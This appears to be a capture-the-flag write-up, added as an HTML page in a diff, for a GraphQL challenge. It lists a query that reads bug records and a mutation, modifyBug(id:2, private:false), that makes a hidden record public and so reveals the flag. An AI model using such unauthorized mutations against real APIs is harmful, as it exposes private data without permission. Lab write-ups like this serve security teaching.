@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Flag 1</title>
+</head>
+
+<body>
+    <ol>
+        <li>
+            First we need to get the <b>allBugs</b>'s <b>test</b> and <b>ID</b>:
+            <pre style="border: 1px black solid; padding: 10px; border-radius: 3px;">
+    {
+        allBugs {
+            id
+            reporterId
+            text
+        }
+    }</pre>
+        <p>there is only one record of bugs; we can not see the second one because it's <b>ok</b> state is set to false.</p>
+        </li>
+        <li>
+            Change the state with following command:
+            <pre style="border: 1px black solid; padding: 10px; border-radius: 3px;">
+    mutation {
+        modifyBug(id:2, private:false) {
+            ok
+        }
+    }</pre>
+        </li>
+        <li>
+            Rerun the first step command to get the flag.
+        </li>
+    </ol>
+    <hr>
+    <a href="../index.html">Home</a>
+</body>
+
+</html>
